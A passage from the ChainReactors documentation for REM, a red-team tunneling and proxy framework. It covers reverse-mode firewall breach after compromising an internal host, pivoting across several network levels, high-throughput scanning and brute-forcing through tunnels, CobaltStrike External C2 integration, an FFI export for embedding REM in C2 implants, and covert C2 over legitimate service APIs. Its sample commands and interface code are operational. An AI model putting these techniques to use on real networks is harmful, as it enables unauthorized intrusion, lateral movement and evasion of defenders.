<ol>
<li>Local application (e.g., port forwarding) receives a connection.</li>
<li>Inbound parses the SOCKS5 request from the local connection.</li>
<li>Encodes the request into SOCKS5 protocol format and sends it to the remote end via <code>bridge</code>.</li>
<li>Remote Outbound processes the request and establishes the target connection.</li>
<li>Response returns via <code>bridge</code>, and Inbound forwards it to the local connection.</li>
</ol>
<h4 id="313-reverse-vs-proxy-mode-inbound-location-determines-network-topology">3.1.3 Reverse vs. Proxy Mode: Inbound Location Determines Network Topology<a class="headerlink" href="#313-reverse-vs-proxy-mode-inbound-location-determines-network-topology" title="Permanent link">&para;</a></h4>
<p><strong>Core Essence:</strong> REM controls where the Inbound resides via <strong>Reverse</strong> and <strong>Proxy</strong> modes, thereby realizing different network topologies and attack scenarios.</p>
<p><strong>Essential Duties of Inbound and Outbound (based on actual code from agent.go):</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// handlerInbound: Listen on local port, accept direct user connections</span>
<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">agent</span><span class="w"> </span><span class="o">*</span><span class="nx">Agent</span><span class="p">)</span><span class="w"> </span><span class="nx">handlerInbound</span><span class="p">(</span><span class="nx">local</span><span class="p">,</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="o">*</span><span class="nx">core</span><span class="p">.</span><span class="nx">URL</span><span class="p">,</span><span class="w"> </span><span class="nx">control</span><span class="w"> </span><span class="o">*</span><span class="nx">message</span><span class="p">.</span><span class="nx">Control</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">agent</span><span class="p">.</span><span class="nx">ListenAndServe</span><span class="p">(</span><span class="nx">local</span><span class="p">,</span><span class="w"> </span><span class="nx">control</span><span class="p">)</span><span class="w">  </span><span class="c1">// Listen on local port</span>
<span class="w">    </span><span class="nx">instant</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">InboundCreate</span><span class="p">(</span><span class="nx">local</span><span class="p">.</span><span class="nx">Scheme</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">)</span><span class="w">  </span><span class="c1">// Create Inbound</span>
<span class="w">    </span><span class="nx">agent</span><span class="p">.</span><span class="nx">Inbound</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">instant</span><span class="w">  </span><span class="c1">// Inbound.Relay() relays user request to remote</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>

<span class="c1">// handlerOutbound: Receive remote relayed requests, process protocol, connect to target</span>
<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">agent</span><span class="w"> </span><span class="o">*</span><span class="nx">Agent</span><span class="p">)</span><span class="w"> </span><span class="nx">handlerOutbound</span><span class="p">(</span><span class="nx">local</span><span class="p">,</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="o">*</span><span class="nx">core</span><span class="p">.</span><span class="nx">URL</span><span class="p">,</span><span class="w"> </span><span class="nx">control</span><span class="w"> </span><span class="o">*</span><span class="nx">message</span><span class="p">.</span><span class="nx">Control</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">instant</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">OutboundCreate</span><span class="p">(</span><span class="nx">local</span><span class="p">.</span><span class="nx">Scheme</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">,</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">NewProxyDialer</span><span class="p">(</span><span class="nx">agent</span><span class="p">.</span><span class="nx">client</span><span class="p">))</span>
<span class="w">    </span><span class="nx">agent</span><span class="p">.</span><span class="nx">Outbound</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">instant</span><span class="w">  </span><span class="c1">// Outbound.Handle() processes protocol request, uses dialer to connect target</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li><strong>Inbound = ListenAndServe + Relay:</strong> Listen for user connections, relay to remote.</li>
<li><strong>Outbound = Handle + Dial:</strong> Process relayed requests, connect to real target.</li>
<li>The same protocol (e.g., <code>Socks5Plugin</code>) implements both interfaces simultaneously; mode selection determines which interface is used.</li>
</ul>
<p><strong>Reverse Mode (Inbound at Server Side - Firewall Breach):</strong></p>
<ul>
<li><strong>Topology:</strong> User Tool → Server (External, isAccept=true) ← Client (Internal, Active Connect)</li>
<li>
<p>Data Flow:</p>
<p>User → Server Listen:1080 → Inbound.Relay() → Tunnel Transport → Client → Outbound.Handle() → Internal Target</p>
</li>
<li>
<p><strong>Server Side:</strong></p>
<ul>
<li><code>ListenAndServe(:1080)</code> listens on SOCKS5 port.</li>
<li>Inbound accepts user SOCKS5 connections.</li>
<li><code>Relay()</code> relays requests to Client.</li>
</ul>
</li>
<li>
<p><strong>Client Side:</strong></p>
<ul>
<li>Actively connects to Server to establish Tunnel.</li>
<li>Outbound receives requests relayed by Server.</li>
<li><code>Handle()</code> parses SOCKS5, <code>Dial()</code> connects to internal target.</li>
</ul>
</li>
<li>
<p><strong>Attack Value:</strong> Client in the intranet actively connects to the external Server, bypassing inbound firewall restrictions. After compromising an internal machine, the Client actively calls out to establish a tunnel, allowing the user to access internal resources via the Server.</p>
</li>
</ul>
<p><strong>Proxy Mode (Inbound at Client Side - Forward Proxy):</strong></p>
<ul>
<li>
<p><strong>Topology:</strong> User Tool → Client (User Side, isAccept=false) → Server (Target Network, isAccept=true)</p>
</li>
<li>
<p>Data Flow:</p>
<p>User → Client Listen:1080 → Inbound.Relay() → Tunnel Transport → Server → Outbound.Handle() → Target Network</p>
</li>
<li>
<p><strong>Client Side:</strong></p>
<ul>
<li>
<p><code>ListenAndServe(:1080)</code> listens on SOCKS5 port.</p>
</li>
<li>
<p>Inbound accepts user SOCKS5 connections.</p>
</li>
<li>
<p><code>Relay()</code> relays requests to Server.</p>
</li>
</ul>
</li>
<li>
<p><strong>Server Side:</strong></p>
<ul>
<li>
<p>Client connects to Server to establish Tunnel.</p>
</li>
<li>
<p>Outbound receives requests relayed by Client.</p>
</li>
<li>
<p><code>Handle()</code> parses SOCKS5, <code>Dial()</code> connects to target network.</p>
</li>
</ul>
</li>
<li>
<p><strong>Attack Value:</strong> Server is located in the target network; user proxies access to the remote target network via local Client. Suitable for multi-level jump host scenarios where the Client can chain connections to multiple Servers.</p>
</li>
</ul>
<p><strong>Mode Essence Comparison:</strong></p>
<table>
<thead>
<tr>
<th><strong>Mode</strong></th>
<th><strong>Inbound Location</strong></th>
<th><strong>User Connection</strong></th>
<th><strong>Target Connection</strong></th>
<th><strong>Typical Scenario</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Reverse</strong></td>
<td>Server Side (External)</td>
<td>Connects to Server</td>
<td>Client connects to Internal</td>
<td>Firewall breach, Internal Penetration</td>
</tr>
<tr>
<td><strong>Proxy</strong></td>
<td>Client Side (Local)</td>
<td>Connects to Client</td>
<td>Server connects to Target Network</td>
<td>Forward Proxy, Cascading Jump Host</td>
</tr>
</tbody>
</table>
<p><strong>Supported Protocols (based on consts.go, bi-directional registration):</strong></p>
<ul>
<li><code>socks5</code> - SOCKS5 Proxy Protocol</li>
<li><code>http</code> - HTTP Proxy Protocol</li>
<li><code>ss</code> - Shadowsocks Protocol</li>
<li><code>trojan</code> - Trojan Protocol</li>
<li><code>forward</code> - Port Forwarding</li>
<li><code>cs</code> - CobaltStrike External C2</li>
<li><code>raw</code> - Raw TCP Forwarding</li>
<li>....</li>
</ul>
<h4 id="314-integration-with-protocol-stack-complete-link-from-transport-to-application">3.1.4 Integration with Protocol Stack: Complete Link from Transport to Application<a class="headerlink" href="#314-integration-with-protocol-stack-complete-link-from-transport-to-application" title="Permanent link">&para;</a></h4>
<p><strong>Complete Data Flow Path (Example: SOCKS5 in Reverse Mode):</strong></p>
<div class="highlight"><pre><span></span><code>User Tool (Port Scanner)
  ↓ [Initiate SOCKS5 connection to Server:1080]
Server Side Inbound (SOCKS5)
  ↓ [Parse SOCKS5 request, extract target address]
  ↓ [Send to remote via bridge.Write()]
Server Side Mux (Section 2.3.3)
  ↓ [Multiplexing, multiple SOCKS5 requests reuse single Tunnel]
Server Side Wrapper Chain (Section 2.3.2)
  ↓ [Encryption/Obfuscation, e.g., AES-CFB → XOR → HTTP Masquerade]
Server Side Tunnel (Section 2.1)
  ↓ [Transport Send, could be TCP/ICMP/DNS etc.]
  ↓ [Possibly via proxyclient proxy chain (Section 2.4)]
Network Transmission
  ↓
Client Side Tunnel (Section 2.1)
  ↓ [Transport Receive]
Client Side Wrapper Chain (Section 2.3.2)
  ↓ [Reverse Decryption: HTTP Strip → XOR De-obfuscate → AES-CFB Decrypt]
Client Side Mux (Section 2.3.3)
  ↓ [Multiplex parsing, distribute to corresponding stream]
Client Side Outbound (SOCKS5)
  ↓ [Handle method parses SOCKS5 request]
  ↓ [Use ContextDialer to connect to target]
Intranet Target (192.168.1.100:22)
</code></pre></div>
<p><strong>Position of Outbound/Inbound in Protocol Stack:</strong></p>
<ul>
<li><strong>Top of Application Layer:</strong> Directly facing user tools and target services.</li>
<li><strong>Dependent on Lower Layers:</strong> Uses Tunnel's <code>net.Conn</code>, Wrapper's encryption, Mux's multiplexing, <code>proxyclient</code>'s proxies.</li>
<li><strong>Protocol Agnostic:</strong> Underlying transport can be TCP/ICMP/DNS/WebShell; Outbound/Inbound does not care.</li>
<li><strong>Dynamic Scalability:</strong> New protocols can be integrated simply by implementing the interface via the registration mechanism.</li>
</ul>
<p>This application layer abstraction allows REM to flexibly combine different protocols and modes, providing a unified application layer foundation for the various attack scenarios described in subsequent sections.</p>
<h3 id="32-zero-performance-loss-proxy-protocol">3.2 Zero Performance Loss Proxy Protocol<a class="headerlink" href="#32-zero-performance-loss-proxy-protocol" title="Permanent link">&para;</a></h3>
<p>The performance bottleneck of traditional proxy tools mainly comes from concurrent processing, especially in high-concurrency scenarios like port scanning. A massive number of fragmented SOCKS handshake packets block and consume system resources, leading to a drastic decline in performance. Traditional tools map every connection to a real network connection, causing severe performance loss.</p>
<p>Based on the technical architecture in Chapter 2, REM's breakthrough solution is <strong>Memory Simulation of SOCKS5 Proxy Protocol</strong>. Through the memory transport layer, REM simulates the SOCKS5 handshake and data exchange process directly in memory, without actual network layer data transmission occurring.</p>
<ul>
<li>When a scanning tool initiates a connection request, REM simulates the complete SOCKS5 handshake flow in memory.</li>
<li>Multiple concurrent requests are scheduled and multiplexed in memory, avoiding the overhead of real network connections.</li>
<li>Batch data is transmitted via optimized tunnels, maximizing bandwidth utilization.</li>
</ul>
<p><strong>Actual Application Effect:</strong></p>
<ul>
<li><strong>Massive Port Scanning:</strong> Single node can handle tens of thousands of concurrent port scans with performance approaching direct connection.</li>
<li><strong>Distributed Brute-forcing:</strong> Large-scale authentication brute-forcing in multi-level tunnel environments with no performance decay.</li>
<li><strong>High-Frequency API Calls:</strong> Supports high-frequency API interface calls unrestricted by proxy layer performance.</li>
</ul>
<p>This zero-performance-loss concurrency handling capability allows attack tools to perform as if running locally even in complex network environments, greatly expanding the tactical choice space.</p>
<h3 id="33-universal-protocol-chain-across-arbitrary-media">3.3 Universal Protocol Chain Across Arbitrary Media<a class="headerlink" href="#33-universal-protocol-chain-across-arbitrary-media" title="Permanent link">&para;</a></h3>
<p>Traditional Limitations of Cascading Network Attacks:</p>
<p>In complex network confrontation environments, attackers often face the challenge of multi-level network penetration. Traditional cascading tools have fundamental limitations:</p>
<p><strong>Evolution of Traditional Cascading Tools:</strong></p>
<ul>
<li><strong>Early Tools:</strong> Relay-style port forwarding tools like <code>lcx</code>, <code>ew</code>.</li>
<li><strong>Modern Tools:</strong> Memory-resident SOCKS5 C2-style cascading like <code>Stowaway</code>, <code>venom</code>.</li>
<li><strong>Common Limitations:</strong> Reliance on fixed protocol stacks, lack of flexible combination capabilities.</li>
</ul>
<p>Core Issues of Traditional Cascading:</p>
<p>Traditional cascading modes suffer from exposed protocol signatures and performance bottlenecks. Regarding signatures, protocols like smux/yamux have fixed characteristics, static protocol stacks, and predictable handshake patterns that are easily identified by detection devices. regarding performance, accumulated latency across multiple layers, protocol conversion overhead, and single-point-of-failure risks lead to performance loss and stability issues in actual use. These fundamental limitations prompted the REM architecture to rethink cascading network design.</p>
<p><strong>Analysis of Actual Cascading Scenarios</strong></p>
<p>Scenario 1: Standard Three-Level Network Penetration</p>
<p>Topology: A (External Server) -- B (Perimeter) -- C (Core Internal)</p>
<p>Plaintext</p>
<div class="highlight"><pre><span></span><code>Node A (External)
      |
Node B (Perimeter)
      |
Node C (Core Internal)
</code></pre></div>
<p><strong>REM Unified Network Protocol Stack</strong></p>
<p>Plaintext</p>
<div class="highlight"><pre><span></span><code>REM Console &lt;--&gt; REM Agent &lt;--&gt; REM Agent &lt;--&gt; Target Node
(Listen Mode)    (Bi-directional)   (Direct Access)
(Protocol Relay) (Protocol Convert)
</code></pre></div>
<p><em>Unified Transport Layer Abstraction</em></p>
<p>Scenario 2: WebShell Cascading Breach</p>
<p>(Diagram implied: WebShell acts as a node in the chain)</p>
<p>Infinite Combination of Transport Media</p>
<p>The REM architecture supports flexible combinations of multiple transport media: TCP, UDP, ICMP, WebSocket, SMB Named Pipes, HTTP API, etc. Any medium with data exchange capability can become a cascading node, allowing attackers to build complex network topologies and reorganize originally isolated network zones into a unified attack infrastructure, significantly expanding the boundaries of network-side confrontation operations.</p>
<h3 id="34-c2-infrastructure-integration">3.4 C2 Infrastructure Integration<a class="headerlink" href="#34-c2-infrastructure-integration" title="Permanent link">&para;</a></h3>
<p>REM provides three different levels of integration schemes for C2 frameworks, each with specific technical advantages and applicable scenarios.</p>
<p>Proxy Channel Reuse</p>
<p>Establish a proxy channel via the REM binary, allowing C2 to reuse it via standard HTTP/SOCKS proxy protocols. This is how the vast majority of proxy tools are currently used.</p>
<p><em>Technical Implementation:</em></p>
<p>Bash</p>
<div class="highlight"><pre><span></span><code># REM starts proxy service
./rem -c [rem_link] -m proxy -l socks5://:1080
./rem -c [rem_link] -m proxy -l http://:8080
</code></pre></div>
<ul>
<li><strong>Protocol Standardization:</strong> Uses standard HTTP/SOCKS5 proxy protocols; C2 frameworks need no modification.</li>
<li><strong>Port Mapping:</strong> REM listens on specified ports, forwarding C2 traffic to the target network.</li>
<li><strong>Protocol Conversion:</strong> REM internally handles the conversion from C2 protocol to transport protocol.</li>
<li><strong>Multi-Protocol Support:</strong> Supports both HTTP and SOCKS5 proxies, adapting to different C2 framework requirements.</li>
</ul>
<p>External C2 Protocol Overloading</p>
<p>Code: <a href="https://github.com/chainreactors/rem/blob/master/protocol/serve/externalc2/externalc2.go">https://github.com/chainreactors/rem/blob/master/protocol/serve/externalc2/externalc2.go</a></p>
<p>Official Docs: <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm</a></p>
<p>Uses the CobaltStrike External C2 mechanism to overload the C2 communication channel with REM as a special application layer protocol.</p>
<p><em>Technical Implementation:</em></p>
<p>Bash</p>
<div class="highlight"><pre><span></span><code># REM constructs External C2 channel
./rem -c [rem_link] -m proxy -l cs://:12345 -r raw://
</code></pre></div>
<p><em>Requires separate Implant (self-implemented) and channel (REM-based).</em></p>
<p>Embedded into Arbitrary C2 Implant</p>
<p>Export REM's core API as a standard FFI interface via CGO, achieving deep integration with any C2 Implant.</p>
<p>FFI Interface Design</p>
<p>Code: <a href="https://github.com/chainreactors/rem/blob/master/cmd/export/main.go">https://github.com/chainreactors/rem/blob/master/cmd/export/main.go</a></p>
<p><strong>FFI Interface (based on actual signature implementation):</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// REM Proxy Connect - Returns Agent ID, NULL on failure</span>
<span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="nf">RemDial</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">cmdline</span><span class="p">);</span>

<span class="c1">// Memory Proxy Connect - Returns connection handle, 0 on failure</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">MemoryDial</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">memhandle</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dst</span><span class="p">);</span>

<span class="c1">// Memory Data Read - Returns bytes read, 0 on failure</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">MemoryRead</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">chandle</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>

<span class="c1">// Memory Data Write - Returns bytes written, 0 on failure</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">MemoryWrite</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">chandle</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>

<span class="c1">// Close Memory Connection - Returns 0 on success, error code on failure</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">MemoryClose</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">chandle</span><span class="p">);</span>

<span class="c1">// Cleanup all Agent connections</span>
<span class="kt">void</span><span class="w"> </span><span class="nf">CleanupAgent</span><span class="p">();</span>
</code></pre></div>
<p><strong>Compilation:</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1"># Compile Dynamic Link Library</span>
go<span class="w"> </span>build<span class="w"> </span>-buildmode<span class="o">=</span>c-shared<span class="w"> </span>-o<span class="w"> </span>rem.dll<span class="w"> </span>-ldflags<span class="w"> </span><span class="s2">&quot;-s -w&quot;</span><span class="w"> </span>.<span class="se">\c</span>md<span class="se">\e</span>xport<span class="se">\</span>
<span class="c1"># Compile Static Link Library</span>
go<span class="w"> </span>build<span class="w"> </span>-buildmode<span class="o">=</span>c-archive<span class="w"> </span>-o<span class="w"> </span>rem.a<span class="w"> </span>-ldflags<span class="w"> </span><span class="s2">&quot;-s -w&quot;</span><span class="w"> </span>.<span class="se">\c</span>md<span class="se">\e</span>xport<span class="se">\</span>
</code></pre></div>
<p><strong>Actual Application Example: Rust Calling FFI in IoM</strong></p>
<div class="highlight"><pre><span></span><code><span class="k">extern</span><span class="w"> </span><span class="s">&quot;C&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">RemDial</span><span class="p">(</span><span class="n">cmdline</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_char</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_char</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryDial</span><span class="p">(</span><span class="n">memhandle</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_char</span><span class="p">,</span><span class="w"> </span><span class="n">dst</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_char</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryRead</span><span class="p">(</span><span class="n">handle</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">MemoryWrite</span><span class="p">(</span><span class="n">handle</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">:</span><span class="w"> </span><span class="nc">c_int</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">c_int</span><span class="p">,</span><span class="w"> </span><span class="n">c_int</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>In the IoM (Implants of Mine) project, calling REM's FFI interface via Rust achieved cross-language deep integration, encapsulating REM's network communication capabilities into low-level APIs similar to <code>libsocket</code>. Any Implant can obtain advanced network functions with near-zero performance loss through simple function calls.</p>
<p>Through FFI API overloading, REM encapsulates network communication capabilities into standard interfaces. This deep integration transforms REM from a C2 communication enhancement tool into a C2 infrastructure component, providing excellent communication capabilities and covertness for modern C2 frameworks.</p>
<h3 id="35-transport-layer-implementation-based-on-arbitrary-channels">3.5 Transport Layer Implementation Based on Arbitrary Channels<a class="headerlink" href="#35-transport-layer-implementation-based-on-arbitrary-channels" title="Permanent link">&para;</a></h3>
<h4 id="351-theoretical-basis-of-arbitrary-channel-abstraction">3.5.1 Theoretical Basis of Arbitrary Channel Abstraction<a class="headerlink" href="#351-theoretical-basis-of-arbitrary-channel-abstraction" title="Permanent link">&para;</a></h4>
<p>An important feature of the REM architecture is: Theoretically, as long as data exchange exists, a REM transport layer can be built. This design philosophy effectively breaks the restrictions of traditional network tools on transport protocols, redefining "data exchange media" as "transport layer protocols."</p>
<p>SMB Named Pipe Case</p>
<p>The REM transport layer implemented based on remote SMB named pipes demonstrates REM's arbitrary channel abstraction capability.</p>
<p>Code: <a href="https://github.com/chainreactors/rem/blob/master/protocol/tunnel/unix/unix_windows.go">https://github.com/chainreactors/rem/blob/master/protocol/tunnel/unix/unix_windows.go</a></p>
<h4 id="353-expanding-the-transport-layer-protocol-ecosystem">3.5.3 Expanding the Transport Layer Protocol Ecosystem<a class="headerlink" href="#353-expanding-the-transport-layer-protocol-ecosystem" title="Permanent link">&para;</a></h4>
<p><strong>Implemented Transport Protocols:</strong></p>
<ul>
<li>TCP</li>
<li>UDP</li>
<li>ICMP</li>
<li>WebSocket</li>
<li>SMB Named Pipe</li>
<li>Unix Socket</li>
<li>DNS (DoH)</li>
<li>.....</li>
</ul>
<h4 id="354-lolc2-duplex-channel-application-of-arq-protocol">3.5.4 lolC2: Duplex Channel Application of ARQ Protocol<a class="headerlink" href="#354-lolc2-duplex-channel-application-of-arq-protocol" title="Permanent link">&para;</a></h4>
<p>The core idea of <strong>lolC2</strong> (Living off the Land C2) is using the original functions of legitimate services to exchange data, masquerading attack traffic as normal business traffic. In the REM architecture, this is a typical application scenario for the ARQ protocol from Section 2.2.</p>
<p>Technical Implementation Principle:</p>
<p>Many legitimate service APIs are essentially half-duplex channels—allowing only the client to initiate requests (e.g., HTTP protocol, webhooks, social media APIs). Through the ARQ protocol implemented in Section 2.2, REM encapsulates these half-duplex channels into duplex channels:</p>
<ul>
<li><strong>HTTP Polling Mode:</strong> Client periodically polls the server to retrieve data, simulating bidirectional communication.</li>
<li><strong>Webhook Callback Mechanism:</strong> Uses webhook functions to enable server active push to clients.</li>
<li><strong>Social Media API:</strong> Establishes covert channels via API interactions like comments and posts.</li>
</ul>
<p>Role of ARQ Duplexing:</p>
<p>The key role of the ARQ protocol here is to provide reliability guarantees and duplex communication capabilities for these unidirectional mechanisms. Through buffer management, data frame encapsulation, and polling control, channels that could originally only transmit unidirectionally can simulate stable bidirectional communication, providing standard transport layer services for upper-layer applications.</p>
<p>This allows any legitimate service capable of data exchange to become a REM transport layer, providing immense flexibility for covert communication.</p>
<p>This arbitrary channel abstraction capability elevates REM from a "network proxy tool" to a "network protocol reconstruction platform," providing significant flexibility and expansion space for network-side confrontation operations.</p>
<hr />
<h2 id="4-conclusion-and-vision">4. Conclusion and Vision<a class="headerlink" href="#4-conclusion-and-vision" title="Permanent link">&para;</a></h2>
<h3 id="41-rem">4.1 REM<a class="headerlink" href="#41-rem" title="Permanent link">&para;</a></h3>
<p>The first line of code for REM was written in 2021. In the interim, it underwent three or four major breakthroughs and reconstructions in engineering and design philosophy, finally forming a complete system.</p>
<p>Based on the protocol stack reconstruction in Chapter 2 and the application scenarios in Chapter 3, REM has formed a complete attack-oriented network confrontation architecture. The core features lead to a fundamental shift in confrontation dimensions:</p>
<ul>
<li><strong>Boundary Dissolution:</strong> by defining the <code>net.Conn</code> interface as a unified boundary, REM allows any medium to become a transport layer, thoroughly dissolving defense systems based on protocol allowlisting.</li>
<li><strong>Feature Concealment:</strong> Programmable Hook mechanisms make traffic characteristics completely unpredictable through dynamic combinations of encryption and compression, thereby thoroughly hiding static fingerprints and behavioral patterns.</li>
<li><strong>Topology Equality:</strong> By abstracting nodes into equal "listening" and "connecting" roles, the same code can flexibly build any network topology, giving every node a dual identity and breaking the rigidity of traditional penetration paths.</li>
</ul>
<p>When defense boundaries are dissolved, attack signatures are concealed, and network topologies become equal and fluid, REM is no longer simply evading rules. Instead, by destroying the certainty of protocols, patterns, and structures, it fundamentally dismantles the basic assumptions relied upon by traditional detection, pushing attack and defense from a technical competition to a new level.</p>
<h3 id="42-direction-of-evolution">4.2 Direction of Evolution<a class="headerlink" href="#42-direction-of-evolution" title="Permanent link">&para;</a></h3>
<p><strong>From "Technology Stacking" to "System Reconstruction."</strong> Breakthroughs in point technologies are becoming difficult and short-lived; truly lasting advantages come from systemic architectural innovation. Through the complete reconstruction of the protocol stack, REM gains not a point breakthrough, but an advantage across an entire dimension.</p>
<p>Traditional detection assumes "attack traffic has identifiable characteristics." When attack traffic can have no fixed characteristics, defenders need to shift from "identifying anomalies" to "proving normality." This requires deeper business understanding, more complete context correlation, and more proactive behavioral modeling.</p>
<p>REM's technology can be used for authorized penetration testing, Red/Blue team confrontation, security research, and defense capability verification. Simultaneously, these technologies remind the entire industry:</p>
<p><strong>Next-generation defense systems need to rethink basic assumptions.</strong> If network traffic can have no fixed patterns, if transport media can be any channel, and if protocol processing can be completely decoupled—then detection systems based on protocol identification, traffic analysis, and behavioral patterns need to be rebuilt at a higher level.</p>
<p>This is not the end of technology, but a new starting point for the evolution of network-side confrontation.</p>









  




                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2025 ChainReactors
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/chainreactors" target="_blank" rel="noopener" title="github.com" class="md-social__link">
